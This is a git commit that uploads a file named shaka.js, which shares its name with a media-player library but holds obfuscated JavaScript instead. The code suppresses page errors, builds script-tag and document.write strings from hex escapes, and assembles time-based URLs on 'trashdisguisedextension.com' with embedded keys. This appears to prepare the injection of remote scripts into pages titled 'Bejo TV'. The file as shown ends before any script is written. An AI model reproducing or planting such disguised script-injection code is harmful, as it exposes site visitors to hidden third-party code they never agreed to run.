c40d6b8a679a03b18b308747193ec2df0ee58c87
elfinoya <165668405+elfinoya@users.noreply.github.com>
2024-04-02 08:43:17 +0900

    Add files via upload

---
+++ shaka.js
@@ -0,0 +1,58 @@
+<!-- start shaka.js-->
+
+        cookieChoices = {};
+        window['onerror'] = function() {
+            return true
+        };
+        s = '.blogspot.';
+        a = window['location']['hostname'];
+        f = a;
+        b = decodeURIComponent(location['href']);
+        A3 = 0;
+        A = '';
+        Z90 = b;
+        X$ = 0;
+        Z0 = 0;
+        if (b['indexOf']('m=1') > -1) {
+            X$ = 1
+        }
+        if (b['indexOf']('m=') > -1) {
+            A = b['split']('m=')[1]
+        }
+        if (A['indexOf']('xyz') > -1) {
+            A3 = 1
+        }
+        P$ = new Date();
+        l = P$['getDate']();
+        h = ('0' + l)['slice'](-2);
+        j = P$['getMonth']();
+        k = ('0' + (j + 1))['slice'](-2);
+        o = P$['getHours']();
+        p = ('0' + o)['slice'](-2);
+        q = P$['getMinutes']();
+        r = ('0' + q)['slice'](-2);
+        Y_ = r;
+        i = P$['getFullYear']();
+        CA3 = h + k + p;
+        u = 'https://';
+        B$ = '\x3cscript';
+        J$ = B$ + '>';
+        K$ = '\x3c/script>';
+        K_ = B$ + " charset='UTF-8' src='";
+        L_ = "'>" + K$;
+        Q$ = ')' + K$;
+        Y$ = J$ + "document['\\x77\\x72\\x69\\x74\\x65'](";
+        ime = '.trashdisguisedextension.com/';
+        ima = ime + 'gn7nwf406x?key=31a520928621e787055cc50496110653';
+        imi = ime + 'tt64fjqae?key=57cd3809e3d35a5c0e261089ae571aa8';
+        ima = u + Y_ + CA3 + ima;
+        imi = u + Y_ + CA3 + imi;
+        izi = ima;
+        if (q & 1) {
+            izi = imi
+        }
+        if (location['href'] == window['top']['location']) {
+            document.title = 'Bejo TV'
+        } 
+<!-- end shaka.js-->
+
